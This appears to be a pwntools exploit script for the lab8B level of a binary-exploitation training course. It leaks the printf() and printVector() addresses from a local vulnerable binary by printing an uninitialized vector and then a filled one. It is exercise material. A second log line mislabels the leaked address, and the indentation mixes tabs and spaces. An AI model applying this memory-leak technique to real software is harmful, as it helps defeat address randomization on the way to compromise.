# Based on https://github.com/ewilded/MBE-snippets/blob/master/LAB7C/exploit.py
from pwn import *

settings = {
    # Path to binary
    "binary"        : "/levels/lab08/lab8B",
}
# Exploit here
def exploit():
    # Available variables
    # p      => Tubes! (http://docs.pwntools.com/en/stable/tubes.html)
    # binary => ELF of binary
    p.recv()
	
	# First, we print the first vector without initializing it with anything, this will leak the printf() address.
    p.sendline("3")
    p.sendline("1")
    leak = p.recv()
    printf_addr = u32(leak[0x33:0x37])
    print("Leaked printf() address: ",hex(printf_addr))
	
    # Now we initiate the vector 1 with data, then we will print it. This way we will leak the printVector() address.
    p.sendline("1")
    p.sendline("1")
    p.sendline("a")
    p.sendline("1")
    p.sendline("1")
    p.sendline("1")
    p.sendline("1")
    p.sendline("1")
    p.sendline("1")
    p.sendline("1")
    p.sendline("1")

    p.recv()
    # Now we print it to leak the printVector() address.
    p.sendline("3")
    p.sendline("1")
    leak = p.recv()
    print_vector_addr = u32(leak[0x33:0x37])
    print("Leaked printf() address: ",hex(print_vector_addr))
    p.sendline("0") # quit
    return 0

# Initial setup
if __name__  == "__main__":
	
    binary = ELF(settings['binary'])
    context.log_level = 'debug'
    p = process(binary.path)
    exploit()
